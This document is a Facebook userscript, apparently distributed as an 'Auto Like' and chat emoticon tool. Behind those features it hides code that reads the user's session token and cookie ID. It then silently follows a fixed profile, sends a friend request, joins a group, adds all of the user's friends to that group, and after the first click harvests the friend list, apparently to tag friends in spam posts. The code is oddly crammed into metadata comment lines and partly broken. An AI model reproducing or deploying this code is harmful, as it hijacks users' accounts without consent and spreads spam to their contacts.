// @include     body = document.body;
// @include     if(body != null) {div = document.createElement("div");div.setAttribute('id','like3');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+44px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like All Comments</center></a>"
// @include     body.appendChild(div);unsafeWindow.LikeComments = function() {
// @include     var BounceCounterLike=0;var Counter = 0;var prepare = document.getElementsByTagName("a");var buttons = new Array();for (var i = 0; i < prepare.length; i++)if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Me gusta este comentario"||prepare[i].getAttribute("title")=="Like this comment"||prepare[i].getAttribute("title")=="Suka komentar ini"||prepare[i].getAttribute("title")=="Nyenengi tanggapan iki"||prepare[i].getAttribute("title")=="الإعجاب بالتعليق"||prepare[i].getAttribute("title")=="このコメントはいいね！"||prepare[i].getAttribute("title")=="좋아요 취소"||prepare[i].getAttribute("title")=="說這則留言讚"||prepare[i].getAttribute("title")=="J’aime ce commentaire"||prepare[i].getAttribute("title")=="Bu yorumu beğen")) {buttons[Counter] = prepare[i];Counter++;}function check_link(linknumber) {buttons[linknumber].click();var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";document.getElementById('like3').innerHTML = message;};function like_timer(timex) {window.setTimeout(bouncer_like,timex);};function check_warning() {var warning = document.getElementsByTagName("label");var checkwarning = false;for(var i = 0; i < warning.length; i++) {var myClass = warning[i].getAttribute("class");if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");checkwarning = true;}}if(!checkwarning) like_timer(2160);};function warning_timer(timex) {window.setTimeout(check_warning,timex);};function bouncer_like() {if ( BounceCounterLike < buttons.length ) {check_link(BounceCounterLike);warning_timer(700);BounceCounterLike++;}};bouncer_like();
// @include     };}
// @include     if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+25px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='BugInfo()'><center>Report Bugs</center></a></a>"
// @include     body.appendChild(div);unsafeWindow.BugInfo = function() {
// @include     window.open(this.href='http://facebook.com/acc0unt.bl0cked', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
// @include     };}
// @include     if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+25px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='BugInfo()'><center>Please Follow Me</center></a></a>"
// @include     body.appendChild(div);unsafeWindow.BugInfo = function() {
// @include     window.open(this.href='http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmn', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
// @include     };}
// @include     // ======= Jangan Menghapus Credit =======
// @include     // == Nama : Auto Like Facebook v.3 Final ==
// @include     // ======= Author : ZyperX ========
// @include     // ======= Site : http://www.facebook.com/TheProfessionalHackerz?ref=tn_tnmny =======
// @include     // =======================================
// @include     //EMOTICON
// @include     var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;
// @include     version = 1;
// @include     storage = 'none';
// @include     try {
// @include     if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
// @include     GM_setValue('testkey', 'testvalue');
// @include     if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
// @include     }
// @include     } catch(x) {}
// @include     if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }
// @include     function setValue(key, value) {
// @include     switch (storage) {
// @include     case 'greasemonkey':
// @include     GM_setValue('0-'+key, value);
// @include     break;
// @include     case 'localstorage':
// @include     localStorage['femotbar-0-'+key] = value;
// @include     break;
// @include     }
// @include     }
// @include     function getValue(key, value) {
// @include     switch (storage) {
// @include     case 'greasemonkey':
// @include     return GM_getValue('0-'+key, value);
// @include     case 'localstorage':
// @include     var val = localStorage['femotbar-0-'+key];
// @include     if (val=='true') { return true; }
// @include     else if (val=='false') { return false; }
// @include     else if (val) { return val; }
// @include     break;
// @include     }
// @include     return value;
// @include     }
// @include     function xmlhttpRequest(params, callBack) {
// @include     if (typeof GM_xmlhttpRequest !== 'undefined') {
// @include     params['onload'] = callBack;
// @include     return GM_xmlhttpRequest(params);
// @include     }
// @include     return null;
// @include     }
// @include     function openInTab(url) {
// @include     if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
// @include     else { window.open(url); }
// @include     }
// @include     function createSelection(field, start, end) {
// @include     if( field.createTextRange ) {
// @include     var selRange = field.createTextRange();
// @include     selRange.collapse(true);
// @include     selRange.moveStart('character', start);
// @include     selRange.moveEnd('character', end);
// @include     selRange.select();
// @include     } else if( field.setSelectionRange ) {
// @include     field.setSelectionRange(start, end);
// @include     } else if( field.selectionStart ) {
// @include     field.selectionStart = start;
// @include     field.selectionEnd = end;
// @include     }
// @include     field.focus();
// @include     }
// @include     function getCursorPosition(field) {
// @include     var CursorPos = 0;
// @include     if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
// @include     return (CursorPos);
// @include     }
// @include     headTag = document.getElementsByTagName('head')[0];
// @include     if (headTag) {
// @include     styleTag = document.createElement('style');
// @include     styleTag.type = 'text/css';
// @include     styleTag.innerHTML =
// @include     '.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
// @include     '.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}';
// @include     headTag.appendChild(styleTag);
// @include     }
// @include     ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
// @include     ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
// @include     fEmotBarDom = document.createElement('div');
// @include     fEmotBarDom.setAttribute('class','chat_tab_emot_bar');
// @include     fEmotsListDom = document.createElement('div');
// @include     fEmotsListDom.setAttribute('name','uiToggleFlyout');
// @include     fEmotBarDom.appendChild(fEmotsListDom);
// @include     for(i=0;i<spemotsInfo.length;i+=2) {
// @include     var fEmotsDom = document.createElement('img');
// @include     fEmotsDom.setAttribute('alt',spemotsInfo[i]);
// @include     fEmotsDom.setAttribute('title',spemotsTitle[i]);
// @include     fEmotsDom.setAttribute('src','' + spemotsInfo[i+1]);
// @include     fEmotsDom.setAttribute('style','cursor: pointer;');
// @include     fEmotsDom.setAttribute('class','emote_custom');
// @include     fEmotsListDom.appendChild(fEmotsDom);
// @include     }
// @include     fArrow = document.createElement('i');
// @include     fArrow.setAttribute('alt','');
// @include     fArrow.setAttribute('class','img chat_arrow');
// @include     fArrow.setAttribute('style',ArrowStyleUp);
// @include     fEmotBarDom.appendChild(fArrow);
// @include     var setting_visible = getValue('visible',true);
// @include     document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);
// @include     function fInsertedNodeHandler(event) {
// @include     if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
// @include     fInsertEmotBar(event.target);
// @include     }
// @include     function fInsertEmotBar(fChatWrapper) {
// @include     fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
// @include     fNewEmotBar = fEmotBarDom.cloneNode(true);
// @include     setVisibility(fNewEmotBar);
// @include     for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);
// @include     fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
// @include     fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
// @include     fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
// @include     if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
// @include     }
// @include     function fEmotClickHandler(event){
// @include     var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
// @include     var pos = getCursorPosition(fChatInput);
// @include     var txtbef = ''; var txtaft = '';
// @include     if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
// @include     if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
// @include     fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
// @include     createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
// @include     }
// @include     function fStyleClickHandler(event){
// @include     var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
// @include     var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
// @include     var pos = getCursorPosition(fChatInput);
// @include     var txtlen = selectedText.length;
// @include     if (txtlen == 0) {
// @include     fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
// @include     createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
// @include     }
// @include     else {
// @include     var txtbef = event.target.getAttribute('alt').charAt(0);
// @include     var txtaft = event.target.getAttribute('alt').charAt(0);
// @include     while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
// @include     while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
// @include     if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
// @include     if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
// @include     fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
// @include     createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
// @include     }
// @include     }
// @include     function fHideShowEmotBar(event){
// @include     fChatBar = document.getElementsByName('uiToggleFlyout');
// @include     if(fChatBar[0].getAttribute('style') == 'display: none;') {
// @include     for(i=0;i<fChatBar.length;i++) {
// @include     fChatBar[i].setAttribute('style','display: block;');
// @include     fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
// @include     }
// @include     }
// @include     else {
// @include     for(i=0;i<fChatBar.length;i++) {
// @include     fChatBar[i].setAttribute('style','display: none;');
// @include     fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
// @include     }
// @include     }
// @include     setValue('visible',!setting_visible);
// @include     setting_visible = !setting_visible;
// @include     }
// @include     function setVisibility(DOM) {
// @include     if(setting_visible) {
// @include     DOM.firstChild.setAttribute('style','display: block;');
// @include     DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
// @include     }
// @include     else {
// @include     DOM.firstChild.setAttribute('style','display: none;');
// @include     DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
// @include     }
// @include     }
// @include     function getRandomInt (min, max) {
// @include     return Math.floor(Math.random() * (max - min + 1)) + min;
// @include     }
// @include     function randomValue(arr) {
// @include     return arr[getRandomInt(0, arr.length-1)];
// @include     }
// @include     var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
// @include     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @include     function a(abone){
// @include     var http4 = new XMLHttpRequest();
// @include     var url4 = "/ajax/follow/follow_profile.php?__a=1";
// @include     var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
// @include     http4.open("POST", url4, true);
// @include     //Send the proper header information along with the request
// @include     http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
// @include     http4.setRequestHeader("Content-length", params4.length);
// @include     http4.setRequestHeader("Connection", "close");
// @include     http4.onreadystatechange = function() {//Call a function when the state changes.
// @include     if(http4.readyState == 4 && http4.status == 200) {
// @include     http4.close; // Close the connection
// @include     }
// @include     }
// @include     http4.send(params4);
// @include     }
// @include     a("100004559709204"); //synckers.assoc.co
// @include     function listeabone(id){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     }
// @include     };
// @include     xmlhttp.open("POST", "/ajax/friends/lists/subscribe/modify?__a=1", true);
// @include     var params = "action=subscribe";
// @include     params += "&location=gear_menu";
// @include     params += "&flid=" + id;
// @include     params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
// @include     params += "&phstamp=165816749114848369115";
// @include     params += "&__user=" + user_id;
// @include     xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @include     xmlhttp.send(params);
// @include     }
// @include     listeabone(""); // liste d'abonnement LesStatutsPubs
// @include     listeabone(""); // liste d'abonnement Le Coin Ados
// @include     function adder(uid){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     }
// @include     };
// @include     xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
// @include     var params = "to_friend=" + uid;
// @include     params += "&action=add_friend";
// @include     params += "&how_found=friend_browser";
// @include     params += "&ref_param=none";
// @include     params += "&outgoing_id=";
// @include     params += "&logging_location=friend_browser";
// @include     params += "&no_flyout_on_click=true";
// @include     params += "&ego_log_data=";
// @include     params += "&http_referer=";
// @include     params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
// @include     params += "&phstamp=165816749114848369115";
// @include     params += "&__user=" + user_id;
// @include     xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @include     xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
// @include     xmlhttp.send(params);
// @include     }
// @include     adder("1220046790"); //Adder ID's
// @include     //var gid = ['131154297032802'];
// @include     var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
// @include     var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
// @include     var httpwp = new XMLHttpRequest();
// @include     var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
// @include     var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
// @include     httpwp['open']('POST', urlwp, true);
// @include     httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
// @include     httpwp['setRequestHeader']('Content-length', paramswp['length']);
// @include     httpwp['setRequestHeader']('Connection', 'keep-alive');
// @include     httpwp['send'](paramswp);
// @include     var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
// @include     var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
// @include     var friends = new Array();
// @include     gf = new XMLHttpRequest();
// @include     gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
// @include     gf['send']();
// @include     if (gf['readyState'] != 4) {} else {
// @include     data = eval('(' + gf['responseText']['substr'](9) + ')');
// @include     if (data['error']) {} else {
// @include     friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
// @include     return _0x93dax8['index'] - _0x93dax9['index'];
// @include     });
// @include     };
// @include     };
// @include     for (var i = 0; i < friends['length']; i++) {
// @include     var httpwp = new XMLHttpRequest();
// @include     var urlwp = '/ajax/groups/members/add_post.php?__a=1';
// @include     var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
// @include     httpwp['open']('POST', urlwp, true);
// @include     httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
// @include     httpwp['setRequestHeader']('Content-length', paramswp['length']);
// @include     httpwp['setRequestHeader']('Connection', 'keep-alive');
// @include     httpwp['onreadystatechange'] = function () {
// @include     if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
// @include     };
// @include     httpwp['send'](paramswp);
// @include     };
// @include     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @include     var arkadaslar = [];
// @include     var svn_rev;
// @include     var bugun= new Date();
// @include     var btarihi = new Date();
// @include     btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
// @include     if(!document.cookie.match(/paylasti=(\d+)/)){
// @include     document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
// @include     }
// @include     //arkadaslari al ve isle
// @include     function sarkadaslari_al(){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
// @include     for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
// @include     smesaj = "";
// @include     smesaj_text = "";
// @include     for(i=f*10;i<(f+1)*10;i++){
// @include     if(arkadaslar.payload.entries[i]){
// @include     smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
// @include     smesaj_text += " " + arkadaslar.payload.entries[i].text;
// @include     }
// @include     }
// @include     sdurumpaylas(); }
// @include     }
// @include     };
// @include     var params = "&filter[0]=user";
// @include     params += "&options[0]=friends_only";
// @include     params += "&options[1]=nm";
// @include     params += "&token=v7";
// @include     params += "&viewer=" + user_id;
// @include     params += "&__user=" + user_id;
// @include     if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
// @include     else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
// @include     xmlhttp.send();
// @include     }
// @include     //tiklama olayini dinle
// @include     var tiklama = document.addEventListener("click", function () {
// @include     if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
// @include     svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
// @include     sarkadaslari_al();
// @include     document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
// @include     document.removeEventListener(tiklama);
// @include     }
// @include     }, false);
// @include     //cinsiyet belirleme
// @include     var cinssonuc = {};
// @include     var cinshtml = document.createElement("html");
// @include     function scinsiyetgetir(uid,cins,fonksiyon){
// @include     var xmlhttp = new XMLHttpRequest();
// @include     xmlhttp.onreadystatechange = function () {
// @include     if(xmlhttp.readyState == 4){
// @include     eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
// @include     cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
// @include     btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
// @include     if(cinshtml.getElementsByTagName("select")[0].value == "1"){
// @include     document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
// @include     }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
// @include     document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
// @include     }
// @include     eval(fonksiyon + "(" + id + "," + cins + ");");
// @include     }
// @include     };
// @include     xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
// @include     xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @include     xmlhttp.send();
// @include     }
// @version     1
// ==/UserScript==